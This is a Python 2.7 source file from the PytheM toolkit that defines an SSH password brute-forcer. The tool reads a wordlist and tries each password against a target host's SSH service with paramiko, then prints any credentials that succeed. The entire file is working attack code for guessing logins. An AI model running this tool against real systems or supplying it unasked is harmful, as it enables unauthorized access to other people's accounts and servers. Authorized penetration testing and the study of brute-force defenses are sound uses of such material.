#!/usr/bin/env python2.7
#coding=UTF-8

# Copyright (c) 2016 Angelo Moura
#
# This file is part of the program PytheM
#
# PytheM is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA

import paramiko
import sys
import os
import socket


class SSHbrutus(object):

	name = "SSH Brute-forcer"
	desc = "Perform password brute-force on SSH"
	version = "0.1"

	def __init__ (self, target, username ,file):

		self.target = target
		self.username = username
		self.file = file
		self.line = "\n------------------------------------------------------------------\n"

		if os.path.exists(file) == False:
			print "\n[!] Path to wordlist don't exist."


	def ssh_connect(self,password, code = 0):
		ssh = paramiko.SSHClient()
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

		try:
			ssh.connect(self.target, port=22, username=self.username, password=password)
		except paramiko.AuthenticationException:
			code = 1
		except socket.error, e:
			code = 2
		ssh.close()
		return code

	def start(self):
		input_file = open(self.file)
		print ""
		for i in input_file.readlines():
			password = i.strip("\n")
			try:
				response = self.ssh_connect(password)
				if response == 0:
					print "{}[+] User: {} [+] Password found!: {}{}".format(self.line,self.username, password, self.line)
			
				elif response == 1:
					print "[-] User: {} [-] Password: {} -->  [+]Incorrect[-]  <--".format(self.username,password)

				elif response == 2:
					print "[!] Connection couldn't be established with the address: {}".format(self.target)
			
			except Exception, e:
				print e
				pass
		input_file.close()
